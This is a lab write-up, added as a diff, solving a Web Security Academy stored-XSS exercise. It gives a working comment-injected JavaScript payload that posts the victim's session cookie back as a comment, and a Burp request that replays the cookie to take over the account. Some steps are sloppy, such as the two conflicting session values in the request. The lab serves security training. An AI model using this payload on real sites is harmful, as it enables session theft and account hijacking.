@@ -1,0 +1,86 @@
+// Lab: Exploiting cross-site scripting to steal cookies
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+
+
+
+// Solution
+
+
+1. Write the script in comment section:
+<script>alert('hacked')</script>
+
+followed by name, website and email
+
+
+2. Now we Inspect and in console we Write:
+    /* document.cookie */ 
+   to get session
+
+
+3. Then we check the source code where at the bottom we find:
+<input required type="hidden" name="csrf" value="nfDuRedgCfknUJRhjxf37CNuzCHOvdX7">
+we check csrf
+
+
+4. Now bypassing the csrf by writing in console:
+    /* document.getElementsByName('csrf')[0].value */
+    we get the value "nfDuRedgCfknUJRhjxf37CNuzCHOvdX7"
+
+
+5. Now Injecting the script we have written and Inject it in comment.
+
+
+// Exploit1.js
+
+{/* <script>
+    window.addEventListener('DOMContentLoaded', function() {
+    
+        const token = document.getElementsByName('csrf')[0].value;
+        const data = new FormData();
+        
+        data.append('csrf', token);
+        data.append('postId', 4);
+        data.append('comment', document.cookie);
+        data.append('name', 'victim');
+        data.append('email', 'sbb@gmail.com');
+        data.append('website', 'http://www.foo.com');
+        
+        fetch('/post/comment', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+        })
+    });
+</script> */}
+
+
+6. We get 2 Information:
+secret=WTzOBNHkEwvorbqcHULqeRVqfvv90zse; 
+session=03vej5wZ9S4hGh8F6ZzGwIlGv6wn7Wsu;
+
+
+7. Now we copy the session and open burp intercept the request and In the /My-account section we send the request to the repeater and at the end we write:
+Cookie: session=03vej5wZ9S4hGh8F6ZzGwIlGv6wn7Wsu;
+
+exactly like this:
+
+GET /my-account HTTP/2
+Host: 0aa1006603f4e62f8170d9f8008200d4.web-security-academy.net
+Cookie: session=KYK7d1oXdbDkqOMYMmaGQpXSJOgGTBsg
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0aa1006603f4e62f8170d9f8008200d4.web-security-academy.net/post?postId=4
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Pririty: u=0, i
+Te: trailers
+Connection: keep-alive
+Cookie: session=03vej5wZ9S4hGh8F6ZzGwIlGv6wn7Wsu;
+
+and press send we get the administrator and our Lab will be solved
